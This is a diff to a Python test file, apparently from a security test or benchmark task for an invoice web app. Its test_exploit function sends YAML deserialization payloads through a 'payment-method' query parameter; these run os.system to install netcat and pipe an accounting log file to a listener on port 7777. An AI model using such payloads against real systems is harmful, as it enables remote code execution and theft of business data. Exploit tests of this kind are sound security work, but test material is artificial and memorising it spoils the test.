@@ -96,9 +96,9 @@ def test_invoice_log_accounting():
 def test_exploit():
     proc = subprocess.Popen(['nc', '-l', '7777'], stdout=PIPE)
 
-    params = {'log-level': '!!python/object/apply:os.system [nc -h || ( apt-get update && apt-get install netcat -y )]'}
+    params = {'payment-method': '!!python/object/apply:os.system [nc -h || ( apt-get update && apt-get install netcat -y )]'}
     requests.get(url = URL, params = params)
-    params = {'log-level': f"!!python/object/apply:os.system [cat /InvoiceApp/invoices/accounting.log | nc {os.environ['TESTING_HOST']} 7777]"}
+    params = {'payment-method': f"!!python/object/apply:os.system [cat /InvoiceApp/accounting/outstanding-invoices.log | nc {os.environ['TESTING_HOST']} 7777]"}
     requests.get(url = URL, params = params)
 
     try:
